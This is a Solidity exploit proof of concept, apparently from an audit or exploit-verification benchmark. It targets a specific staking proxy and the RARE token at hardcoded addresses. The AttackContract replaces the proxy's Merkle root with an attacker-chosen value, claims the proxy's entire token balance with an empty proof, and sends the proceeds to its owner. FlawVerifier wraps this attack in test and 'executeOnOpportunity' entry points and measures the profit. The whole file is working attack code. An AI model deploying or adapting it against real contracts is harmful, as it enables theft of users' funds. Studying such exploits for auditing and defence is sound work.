// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC1967Proxy {
    function updateMerkleRoot(bytes32 newRoot) external;
    function claim(uint256 amount, bytes32[] calldata proof) external;
}

contract AttackContract {
    address internal constant PROXY = 0x3f4D749675B3e48bCCd932033808a7079328Eb48;
    address internal constant RARE = 0xba5BDe662c17e2aDFF1075610382B9B691296350;

    address internal immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function getStakingContractBalance() public view returns (uint256) {
        if (PROXY.code.length == 0 || RARE.code.length == 0) {
            return 0;
        }

        return IERC20Minimal(RARE).balanceOf(PROXY);
    }

    function getTokenBalance() public view returns (uint256) {
        if (RARE.code.length == 0) {
            return 0;
        }

        return IERC20Minimal(RARE).balanceOf(address(this));
    }

    function attack(bytes32 newRoot, uint256 amount) public {
        if (PROXY.code.length == 0 || RARE.code.length == 0) {
            return;
        }

        // Preserve the exact exploit causality from the finding:
        // 1) overwrite the active Merkle root with an attacker-chosen root,
        // 2) immediately claim with an empty proof because the forged leaf is the
        //    entire one-leaf tree root.
        IERC1967Proxy(PROXY).updateMerkleRoot(newRoot);
        IERC1967Proxy(PROXY).claim(amount, new bytes32[](0));

        uint256 claimedBalance = IERC20Minimal(RARE).balanceOf(address(this));
        if (claimedBalance > 0) {
            require(IERC20Minimal(RARE).transfer(owner, claimedBalance), "RARE_TRANSFER_FAILED");
        }
    }
}

contract FlawVerifier {
    address internal constant TARGET_IMPLEMENTATION = 0xfFB512B9176D527C5D32189c3e310Ed4aB2Bb9eC;
    address internal constant PROXY = 0x3f4D749675B3e48bCCd932033808a7079328Eb48;
    address internal constant RARE = 0xba5BDe662c17e2aDFF1075610382B9B691296350;

    AttackContract public immutable attackContract;
    address internal immutable ATTACK_CONTRACT;
    uint256 internal immutable baselineProfitBalance;

    constructor() {
        AttackContract deployed = new AttackContract();
        attackContract = deployed;
        ATTACK_CONTRACT = address(deployed);

        if (RARE.code.length > 0) {
            baselineProfitBalance = IERC20Minimal(RARE).balanceOf(address(this));
        } else {
            baselineProfitBalance = 0;
        }
    }

    function _environmentReady() internal view returns (bool) {
        return TARGET_IMPLEMENTATION.code.length > 0 && PROXY.code.length > 0 && RARE.code.length > 0;
    }

    function _executeExploit() internal {
        if (!_environmentReady()) {
            return;
        }

        uint256 stakingContractBalance = attackContract.getStakingContractBalance();
        if (stakingContractBalance == 0) {
            return;
        }

        // direct_or_existing_balance_first:
        // the victim proxy already custodies the RARE to be stolen, so the PoC
        // does not require any temporary external funding step.
        bytes32 fakeRoot = keccak256(abi.encodePacked(ATTACK_CONTRACT, stakingContractBalance));
        attackContract.attack(fakeRoot, stakingContractBalance);
    }

    function executeOnOpportunity() external {
        _executeExploit();
    }

    function testExploit() external {
        if (!_environmentReady()) {
            return;
        }

        // Keep the exploit path ordering identical to the finding:
        // compute stakingContractBalance -> compute fakeRoot -> call attack().
        uint256 stakingContractBalance = attackContract.getStakingContractBalance();
        if (stakingContractBalance == 0) {
            return;
        }

        bytes32 fakeRoot = keccak256(abi.encodePacked(ATTACK_CONTRACT, stakingContractBalance));
        attackContract.attack(fakeRoot, stakingContractBalance);
    }

    function profitToken() external pure returns (address) {
        return RARE;
    }

    function profitAmount() external view returns (uint256) {
        if (RARE.code.length == 0) {
            return 0;
        }

        uint256 currentBalance = IERC20Minimal(RARE).balanceOf(address(this));
        if (currentBalance <= baselineProfitBalance) {
            return 0;
        }

        return currentBalance - baselineProfitBalance;
    }
}
